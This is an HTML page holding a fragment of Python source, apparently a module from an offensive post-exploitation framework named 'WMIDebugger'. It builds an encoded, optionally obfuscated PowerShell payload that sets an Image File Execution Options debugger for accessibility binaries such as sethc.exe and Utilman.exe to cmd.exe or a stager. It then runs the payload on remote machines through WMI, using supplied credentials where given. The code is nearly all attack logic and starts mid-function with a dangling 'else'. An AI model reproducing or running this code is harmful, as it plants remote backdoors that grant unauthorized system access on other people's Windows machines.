<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
<title>WMIDebugger</title>
</head><body>Uses WMI to set the debugger for a target binary on a remote machine to be cmd.exe or a stager.<br/>
Does not need Admin<br/>
<br/>
Target binary to set the debugger for (sethc.exe, Utilman.exe, osk.exe, Narrator.exe, or Magnify.exe)<br/>
<br/>
Script = &quot;&quot;&quot;$null = Invoke-WmiMethod -Path Win32_process -Name create&quot;&quot;&quot;<br/>
else:<br/>
      payloadCode = &quot;$null=New-Item -Force -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\&quot;+targetBinary+&quot;';$null=Set-ItemProperty -Force -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\&quot;+targetBinary+&quot;' -Name Debugger -Value '&quot;+binary+&quot;';&quot;<br/>
      <br/>
      statusMsg += &quot; to set the debugger for &quot;+targetBinary+&quot; to be &quot; + binary + &quot;.&quot;<br/>
<br/>
    # unicode-base64 the payload code to execute on the targets with -enc<br/>
    encPayload = helpers.enc_powershell(payloadCode)<br/>
<br/>
    # build the WMI execution string<br/>
    computerNames = &quot;\&quot;&quot; + &quot;\&quot;,\&quot;&quot;.join(self.options['ComputerName']['Value'].split(&quot;,&quot;)) + &quot;\&quot;&quot;<br/>
<br/>
    script += &quot; -ComputerName @(&quot;+computerNames+&quot;)&quot;<br/>
    script += &quot; -ArgumentList \&quot;C:\\Windows\\System32\\WindowsPowershell\\v1.0\\powershell.exe -enc &quot; + encPayload + &quot;\&quot;&quot;<br/>
<br/>
    # if we're supplying alternate user credentials<br/>
    if userName != '':<br/>
      script = &quot;$PSPassword = \&quot;&quot;+password+&quot;\&quot; | ConvertTo-SecureString -asPlainText -Force;$Credential = New-Object System.Management.Automation.PSCredential(\&quot;&quot;+userName+&quot;\&quot;,$PSPassword);&quot; + script + &quot; -Credential $Credential&quot;<br/>
<br/>
    script += &quot;;'Invoke-Wmi executed on &quot; +computerNames + statusMsg+&quot;'&quot;<br/>
    if obfuscate:<br/>
      script = helpers.obfuscate(self.mainMenu.installPath, psScript=script, obfuscationCommand=obfuscationCommand)<br/>
    return script<br/>
</body></html>